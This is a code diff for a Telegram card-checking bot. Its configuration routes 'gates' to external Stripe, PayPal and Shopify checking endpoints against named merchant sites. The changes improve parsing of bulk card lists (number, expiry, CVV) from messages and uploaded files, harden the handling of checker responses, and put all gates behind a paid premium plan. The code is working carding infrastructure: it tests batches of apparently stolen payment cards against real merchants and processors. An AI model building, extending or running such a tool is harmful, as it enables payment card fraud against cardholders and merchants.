@@ -18,9 +18,6 @@ GATE_CONFIG = {
     "au":   {"name": "Sᴛʀɪᴘᴇ Aᴜᴛʜ", "url": "https://stripe-auth-test-production.up.railway.app/st0", "site": "fashionspicex.com", "use_proxy": False, "price": "0$"},
     "mss":  {"name": "Sᴛʀɪᴘᴇ Mᴀss", "url": "https://stripe-auth-test-production.up.railway.app/st0", "site": "fashionspicex.com", "use_proxy": False, "price": "0$"},
     "mpp2": {"name": "PᴀʏPᴀʟ Mᴀss", "url": "https://paypal0-1.onrender.com/pp1/cc={card}", "site": "", "use_proxy": False, "price": "0.10$"},
-    "msh":  {"name": "Sʜᴏᴘɪғʏ", "url": "https://autosh.up.railway.app/shopii", "site": "https://powerbuild.store", "use_proxy": True, "price": "1$"},
-    "mchk": {"name": "Sᴛʀɪᴘᴇ", "url": "https://stripe-auth-test-production.up.railway.app/st0", "site": "fashionspicex.com", "use_proxy": False, "price": "0$"},
-    "mpp":  {"name": "PᴀʏPᴀʟ", "url": "https://paypal0-1.onrender.com/pp1/cc={card}", "site": "", "use_proxy": False, "price": "0.10$"},
 }
 
 def load_list_from_file(filename: str, default_list: list) -> list:
@@ -41,7 +38,7 @@ def parse_cards(text: str) -> list:
     cards = []
     
     # Split by common separators
-    for sep in ['\n', '|', ';', ',']:
+    for sep in ['\n', '|', ';', ',', '\r']:
         text = text.replace(sep, '\n')
     
     lines = text.split('\n')
@@ -54,7 +51,8 @@ def parse_cards(text: str) -> list:
         parts = line.split('|')
         if len(parts) >= 4:
             card_num = parts[0].strip()
-            # Check if it's a valid card number (13-19 digits)
+            # Clean card number - remove spaces
+            card_num = re.sub(r'\s+', '', card_num)
             if re.search(r'\d{13,19}', card_num):
                 cards.append(line)
             continue
@@ -68,7 +66,17 @@ def parse_cards(text: str) -> list:
         # Just card number without expiry
         match = re.search(r'(\d{13,19})', line)
         if match:
-            cards.append(match.group(1))
+            card_num = match.group(1)
+            # If it has expiry info after it, try to extract
+            remaining = line[match.end():].strip()
+            if remaining:
+                parts = re.findall(r'\d+', remaining)
+                if len(parts) >= 3:
+                    cards.append(f"{card_num}|{parts[0]}|{parts[1]}|{parts[2]}")
+                else:
+                    cards.append(card_num)
+            else:
+                cards.append(card_num)
     
     return cards
 
@@ -97,13 +105,26 @@ async def extract_cards_from_update(update: Update, bot) -> list | None:
         if cards: 
             return cards
     
-    # 2. Check if there's a file attached (direct file upload)
+    # 2. Check if there's a file attached (direct file upload with command as caption)
     if msg.document and msg.document.file_id:
         content = await _download_file_cards(bot, msg.document.file_id)
         if content:
             cards = parse_cards(content)
             if cards: 
                 return cards
+        else:
+            # If file download failed, try to get from caption
+            if msg.caption and msg.caption.strip():
+                # Remove command from caption
+                caption_text = msg.caption
+                for cmd in ['/au', '/mss', '/mpp2']:
+                    if caption_text.startswith(cmd):
+                        caption_text = caption_text[len(cmd):].strip()
+                        break
+                if caption_text:
+                    cards = parse_cards(caption_text)
+                    if cards:
+                        return cards
     
     # 3. Reply to a message (text or file)
     if msg.reply_to_message:
@@ -174,12 +195,18 @@ async def check_single_card(session, gate_key, api_url, site, card, proxy, semap
             if "{card}" in api_url:
                 url = api_url.replace("{card}", card)
                 async with session.get(url) as resp:
-                    data = await resp.json(content_type=None)
+                    try:
+                        data = await resp.json(content_type=None)
+                    except:
+                        data = {"response": await resp.text(), "status": "false"}
             else:
                 params = {"cc": card, "site": site}
                 if proxy: params["proxy"] = proxy
                 async with session.get(api_url, params=params) as resp:
-                    data = await resp.json(content_type=None)
+                    try:
+                        data = await resp.json(content_type=None)
+                    except:
+                        data = {"response": await resp.text(), "status": "false"}
             
             if not isinstance(data, dict): 
                 data = {"Response": str(data), "Status": "false"}
@@ -217,18 +244,40 @@ async def process_mass(update: Update, context: ContextTypes.DEFAULT_TYPE, gate_
     use_proxy = cfg["use_proxy"]
     price = cfg["price"]
     
+    # Check if gate is ON
     if not context.bot_data.get(f"{gate_key}_on", True):
         await update.message.reply_text("⚠️ Gᴀᴛᴇ ➤ OFF", parse_mode="HTML")
         return
+    
+    # Check if user has premium for premium gates
+    user_id = update.effective_user.id
+    ud = context.bot_data.get("user_data", {}).get(str(user_id), {})
+    is_premium = ud.get("plan", "TRIAL").upper() != "TRIAL" and ud.get("expires", 0) > time.time()
+    
+    # All gates are premium only
+    if not is_premium:
+        await update.message.reply_text(
+            f"⚠️ <b>Pʀᴇᴍɪᴜᴍ Gᴀᴛᴇ</b>\n\n"
+            f"This gate is only available for premium users.\n"
+            f"Use /plan to upgrade.\n\n"
+            f"Premium Gates:\n"
+            f"/au ➺ Stripe Auth\n"
+            f"/mss ➺ Stripe Mass\n"
+            f"/mpp2 ➺ PayPal Mass",
+            parse_mode="HTML"
+        )
+        return
         
     cards = await extract_cards_from_update(update, context.bot)
+    
+    # If no cards found, show usage
     if not cards:
         await update.message.reply_text(
-            f"⚠️ Uꜱᴀɢᴇ:\n\n"
+            f"⚠️ <b>Uꜱᴀɢᴇ:</b>\n\n"
             f"1️⃣ Send a .txt file with <code>/{gate_key}</code> as caption\n"
             f"2️⃣ Reply to a .txt file with <code>/{gate_key}</code>\n"
             f"3️⃣ Use: <code>/{gate_key} cc|mm|yy|cvv</code>\n\n"
-            f"Example: <code>/{gate_key} 4111111111111111|12|2026|123</code>", 
+            f"<b>Example:</b> <code>/{gate_key} 4111111111111111|12|2026|123</code>", 
             parse_mode="HTML"
         )
         return
@@ -310,9 +359,6 @@ async def process_mass(update: Update, context: ContextTypes.DEFAULT_TYPE, gate_
 async def cmd_au(update, context): await process_mass(update, context, "au")
 async def cmd_mss(update, context): await process_mass(update, context, "mss")
 async def cmd_mpp2(update, context): await process_mass(update, context, "mpp2")
-async def cmd_msh(update, context): await process_mass(update, context, "msh")
-async def cmd_mchk(update, context): await process_mass(update, context, "mchk")
-async def cmd_mpp(update, context): await process_mass(update, context, "mpp")
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # CALLBACK HANDLER FOR RESULT BUTTONS
@@ -398,8 +444,5 @@ def get_mass_handlers():
         CommandHandler("au", cmd_au),
         CommandHandler("mss", cmd_mss),
         CommandHandler("mpp2", cmd_mpp2),
-        CommandHandler("msh", cmd_msh),
-        CommandHandler("mchk", cmd_mchk),
-        CommandHandler("mpp", cmd_mpp),
         CallbackQueryHandler(mass_callback_handler, pattern=r'^result_')
     ]
